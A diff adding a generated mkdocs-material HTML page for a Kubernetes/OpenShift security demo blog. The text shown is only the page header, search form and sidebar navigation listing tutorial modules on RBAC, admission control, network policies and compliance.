@@ -1,0 +1,3013 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://ocpsec.ralvares.com/threat-detection-response/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.1">
+    
+    
+      
+        <title>The Unhackable Blog - kubernetes/OpenShift Security & Demo and More.</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.57a0d79d.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#the-unhackable-blog" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="kubernetes/OpenShift Security &amp; Demo and More." class="md-header__button md-logo" aria-label="kubernetes/OpenShift Security & Demo and More." data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            kubernetes/OpenShift Security & Demo and More.
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              The Unhackable Blog
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ralvares/security-demos" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ralvares/security-demos
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="kubernetes/OpenShift Security &amp; Demo and More." class="md-nav__button md-logo" aria-label="kubernetes/OpenShift Security & Demo and More." data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    kubernetes/OpenShift Security & Demo and More.
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ralvares/security-demos" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ralvares/security-demos
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RHACS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RHACS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../demo_app/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Demo App
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CIS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CIS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cis/cis-DrivenSecurityOperationsProgram/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The CIS-Driven Security Operations Program
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cis/cis-ContinuousVulnerabilityManagement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The CIS-Driven Vulnerability Management Program (VMP)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modules
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 1 - Architecture, Threats & Security Strategy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 1 - Architecture, Threats & Security Strategy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/architecture%20and%20threat%20awareness/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenShift Security Architecture & Threat Awareness
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The 10 Essential Controls - A Unified Kubernetes Security Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The 8 Pillars of a Secure Container Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/The%20Risk-Driven%20Business%20Conversation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Risk-Driven Business Conversation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 2 - Secure Multi-Tenancy & Project Governance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 2 - Secure Multi-Tenancy & Project Governance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rbac/multi-tenancy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi-Tenancy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rbac/project-demo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Automated Project Provisioning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 3 - Identity and Access Management
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 3 - Identity and Access Management
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IAM and Admission Control Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rbac/rbac-intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RBAC Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rbac/custom-roles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Granular Custom Roles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 4 - Admission Control & Enforcement
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 4 - Admission Control & Enforcement
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IAM and Admission Control Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/quota/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resource Quotas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/ClusterResourceQuota/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cluster-Wide Quotas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/limits/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LimitRanges
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/usernamespaces/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Namespaces Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4_6" id="__nav_4_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Context Constraints (SCC)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Context Constraints (SCC)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/scc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SCC Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/scc/SCC-LayersOfContainerSecurity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SCC Defense in Depth - DAC & MAC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/scc/custom/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SCC Customization - Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4_7" id="__nav_4_4_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Real Danger of Privileged Containers
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    The Real Danger of Privileged Containers
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/ShadowAPI-rke2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SUSE RKE2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/ShadowAPI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenShift
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/vap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Validating Admission Policy (VAP) Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../admissioncontrols/vap/vap-demo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Validating Admission  Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 5 - Network Security & Isolation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 5 - Network Security & Isolation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Policies - Intro
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/networkpolicies/protecting-the-network-using-networkpolicies/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Policies - Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/networkpolicies/adminnetworkpolicies/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Admin Network Policies Intro
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/networkpolicies/anp-demo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Admin Network Policies - Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/zones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Security Zones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 6 - Compliance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 6 - Compliance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/compliance-operator-demo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compliance Operator - Custom Rules - Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/compliance-operator-variables/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compliance Operator Custom Rules - Variables
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../compliance/manifests/tailor-profile/readme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACM Security Compliance Policies - Demo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
